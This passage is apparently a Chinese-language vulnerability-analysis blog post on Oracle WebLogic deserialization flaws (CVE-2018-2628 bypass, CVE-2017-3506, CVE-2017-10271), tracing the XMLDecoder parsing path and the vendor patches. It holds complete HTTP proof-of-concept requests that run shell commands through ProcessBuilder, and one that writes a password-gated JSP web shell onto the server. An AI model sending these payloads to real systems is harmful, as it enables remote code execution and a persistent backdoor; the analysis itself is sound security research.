<p>按UTF格式读取一个字符串（UnicastRef），然后注册该类、实例化赋给ref属性，然后调用ref属性的readExternal方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304241937296.png" alt="image-20230424193739241"></p>
<p>接着调用LiveRef的静态方法read，将输入流传递。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242038840.png" alt="image-20230424203807760"></p>
<p>ObjID是远程对象的唯一标识，然后调用registerRefs方法（图中说错了，应该是作为DGC客户端去租用远程对象引用）。</p>
<p>后续跳过一些类，来到UnicastRef的newCall方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242047333.png" alt="image-20230424204750279"></p>
<p>获取TCP信道，然后发起连接。</p>
<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>在<code>ServerChannelInputStream</code>的<code>resolveProxyClass</code>方法中使用了黑名单对反序列化类进行限制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">   String[] arr$ = interfaces;</span><br><span class="line">   int len$ = interfaces.length;</span><br><span class="line"></span><br><span class="line">   for(int i$ = 0; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">      String intf = arr$[i$];</span><br><span class="line">      if(intf.equals(&quot;java.rmi.registry.Registry&quot;)) &#123;</span><br><span class="line">         throw new InvalidObjectException(&quot;Unauthorized proxy deserialization&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   return super.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于我们使用的是动态代理类，代理的接口为Registry，而该resolveProxyClass方法中，判断反序列化的类实现的接口是否为java.rmi.registry.Registry，是的话则抛出异常。巧好就修复了该漏洞。</p>
<p>但是我们只需用java.rmi.activation.Activator替换java.rmi.registry.Registry就能绕过该补丁，这就是CVE-2018-2628的原理。</p>
<h2 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>使用<a href="https://github.com/Al1ex/CVE-2017-3506">CVE-2017-3506</a>作为payload。</p>
<p>这是个XMLDecoder的反序列化漏洞，先理解一下XMLDecoder：</p>
<h4 id="JDK1-6的XMLDecoder"><a href="#JDK1-6的XMLDecoder" class="headerlink" title="JDK1.6的XMLDecoder"></a>JDK1.6的XMLDecoder</h4><p>XMLDecoder用来解析XML元素，在jdk1.6中，它带有一个handler属性，这个属性是ObjectHandler类型，使用该属性来解析XML标签。</p>
<p>在ObjectHandler类中，startElement方法用来解析开始标签，他接受两个参数，第一个var1为标签名，第二个var2是标签带有的属性列表。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242135913.png" alt="image-20230424213522807"></p>
<p>这里根据不同的标签和标签所带的属性进行解析。var4是MutableExpression类实例：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242143239.png" alt="image-20230424214353203"></p>
<p>当调用MutableExpression类的getValue时，他会执行methodName所指定的方法。</p>
<p>然后看看startElement方法下面：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242142807.png" alt="image-20230424214204718"></p>
<p>会根据不同的标签名，将不同的方法和目标绑定到MutableExpression类实例中（var4.setMethodName和var4.setTarget）</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242149985.png" alt="image-20230424214906928"></p>
<p>然后将MutableExpression类实例添加到栈中。</p>
<p>接着在ObjectHandler的endElement方法解析结束标签：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242149367.png" alt="image-20230424214951250"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242150607.png" alt="image-20230424215002563"></p>
<p>而它会从栈中取出MutableExpression类实例并通过getValue执行绑定的方法。</p>
<p>poc如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.65.112:7001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>824</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">SOAPAction</span>:</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_131&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>touch /tmp/CVE-2017-3506<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>在该路由&#x2F;wls-wsat&#x2F;CoordinatorPortType解析了xml标签，打断点查看处理过程：</p>
<p>WorkContextServerTube#processRequest来处理请求：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242220868.png" alt="image-20230424222042775"></p>
<p>调用getMessage方法，进入getMessage方法查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242222901.png" alt="image-20230424222210848"></p>
<p>其实这个if就是判断是否有XML约束信息。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242225887.png" alt="image-20230424222504801"></p>
<p>获取头列表。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242228734.png" alt="image-20230424222838658"></p>
<p>判断头列表是否有WorkContext。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242230910.png" alt="image-20230424223041853"></p>
<p>接着调用readHeaderOld方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242234917.png" alt="image-20230424223449851"></p>
<p>这里简单包装转化了一下，然后调用receive方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242236894.png" alt="image-20230424223617820"></p>
<p>接着调用receiveRequest方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242236040.png" alt="image-20230424223653973"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242237062.png" alt="image-20230424223710019"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242237045.png" alt="image-20230424223736981"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242237552.png" alt="image-20230424223753493"></p>
<p>最后来到了xmlDecoder的readObject方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242238896.png" alt="image-20230424223857862"></p>
<p>会调用getHandler获取处理器。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304242238853.png" alt="image-20230424223847791"></p>
<p>然后在getHandler方法中，由于handler属性为空，所以创建一个新的ObjectHandler赋给handler属性，并调用parse方法解析xml输入流。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">	&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">		&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">			&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">		&lt;/void&gt;</span><br><span class="line">		&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">			&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">		&lt;/void&gt;</span><br><span class="line">		&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">			&lt;string&gt;touch /tmp/CVE-2017-3506&lt;/string&gt;</span><br><span class="line">		&lt;/void&gt;</span><br><span class="line">	&lt;/array&gt;</span><br><span class="line">	&lt;void method=&quot;start&quot;/&gt;</span><br><span class="line">&lt;/void&gt;</span><br></pre></td></tr></table></figure>

<p>解析的时候会实例化ProcessBuilder，并调用start方法执行命令。</p>
<p>对于标签的处理流程如下：</p>
<ol>
<li>解析到void标签，设置表达式的target为ProcessBuilder，method为new，然后压栈；</li>
<li>解析到array标签，设置表达式的target为Array，method为new，然后压栈；</li>
<li>解析到array结束标签，出栈，实例化String数组；</li>
<li>解析到void标签（<code>&lt;void method=&quot;start&quot;/&gt;</code>），设置method为start，因为没有class属性，所以没有设置target，然后出栈，new一个ProcessBuilder，然后将ProcessBuilder实例设置成target；</li>
<li>解析到void结束标签，出栈，执行ProcessBuilder的start方法。</li>
</ol>
<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>安装补丁后，WorkContextXmlInputAdapter添加了个validate方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">WorkContextXmlInputAdapter</span><span class="params">(InputStream is)</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">next</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      next = is.read();</span><br><span class="line">      <span class="keyword">while</span> (next != -<span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        baos.write(next);</span><br><span class="line">        next = is.read();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Failed to get data from input stream&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    validate(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray()));</span><br><span class="line">    <span class="built_in">this</span>.xmlDecoder = <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray()));</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">      parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>()</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span></span><br><span class="line">          <span class="keyword">throws</span> SAXException</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid context type: object&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ParserConfigurationException e)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (SAXException e)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IOException e)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>validate方法里，判断开始标签是不是object，是的话直接抛出异常。我们payload中并没有用到object标签，因为我们用的poc就是接下来的10271的，原本3506的poc是会带有object标签的。</p>
<h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>这个漏洞就是上一个漏洞CVE-2017-3506的绕过，因为限制了object标签，所以说可以使用void标签代替来绕过。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.65.112:7001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>824</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">SOAPAction</span>:</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_131&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">string</span>&gt;</span>touch /tmp/CVE-2017-3506<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>不仅执行命令，还可以写文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType11 HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:7001</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: Hm_lvt_6809c4d9953f5afcfe906ac76fa71351=1630056737; __TOKEN_STR__=GwxrMBdYmhPjzFQjHMkGWZhSCBcKs2ph; PHPSESSID=7cn2h9mrdhgigdb4u5fp9qisjo; ADMINCONSOLESESSION=f1HhhtJG85wZsjZx6gFNDTFBFHTnpx3hJljXPn004pMGYCt7G0T0!-1612411983</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 611</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>&lt;![CDATA[&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">int a = -1;</span><br><span class="line">byte[] b = new byte[2048];</span><br><span class="line">out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">while((a=in.read(b))!=-1)&#123;</span><br><span class="line">out.println(new String(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(&quot;&lt;/pre&gt;&quot;);&#125; %&gt;]]&gt;<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>找了半天，终于在这找到补丁<a href="https://github.com/pssss/CVE-2017-10271">https://github.com/pssss/CVE-2017-10271</a></p>
<p>这里在安装这个补丁的时候会显示补丁冲突：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304252334885.png" alt="image-20230425233431528"></p>
<p>补丁的安装步骤之前说过，只不过这里需要删除冲突的补丁：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bsu.sh -remove -patchlist=EJUW -prod_dir=/u01/app/oracle/middleware/wlserver -verbose</span><br><span class="line">./bsu.sh -remove -patchlist=ZLNA -prod_dir=/u01/app/oracle/middleware/wlserver -verbose</span><br></pre></td></tr></table></figure>

<p>打补丁后的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, StringlocalName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">	<span class="keyword">if</span>(qName.equalsIgnoreCase(“object”))&#123;</span><br><span class="line">		<span class="keyword">throw</span> newIllegalStateException(“Invalid element qName:object”);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(“<span class="keyword">new</span>”))&#123;</span><br><span class="line">		<span class="keyword">throw</span> newIllegalStateException(“Invalid element qName:<span class="keyword">new</span>”);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(“method”))&#123;</span><br><span class="line">		<span class="keyword">throw</span> newIllegalStateException(“Invalid element qName:method”);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span>(qName.equalsIgnoreCase(“<span class="keyword">void</span>”)) &#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> <span class="variable">attClass</span> <span class="operator">=</span> <span class="number">0</span>; attClass&lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">				<span class="keyword">if</span>(!”index”.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">					<span class="keyword">throw</span> newIllegalStateException(“Invalid attribute <span class="keyword">for</span> element <span class="keyword">void</span>:” +attributes.getQName(attClass));</span><br><span class="line">				&#125;</span><br><span class="line">            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;array&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(var9 != <span class="literal">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">&quot;byte&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;The value of class attribute is not valid for array element.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在解析元素的开始标签时，若是object、new、method以及void标签带有属性不是index的都抛出异常。</p>
